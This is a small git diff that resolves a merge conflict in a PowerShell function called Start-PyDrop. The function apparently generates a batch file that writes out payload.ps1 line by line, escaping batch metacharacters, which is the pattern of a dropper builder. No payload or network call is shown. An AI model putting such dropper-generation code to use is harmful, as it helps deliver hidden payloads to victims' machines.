@@ -112,10 +112,7 @@ function Start-PyDrop {
             $line_split = $line_split.Replace("`r", "")
             $line_split = $line_split.Replace("|", "^|")
             $line_split = $line_split.Replace(">", "^>")
-<<<<<<< HEAD
             $line_split = $line_split.Replace("<", "^<")
-=======
->>>>>>> 2b9afa7b43171ff8221938e44c9e2d9cf7edda2a
             $line = "echo " + $line_split + " >> payload.ps1"
             Add-Content ".\Output\payload.bat" $line
         }
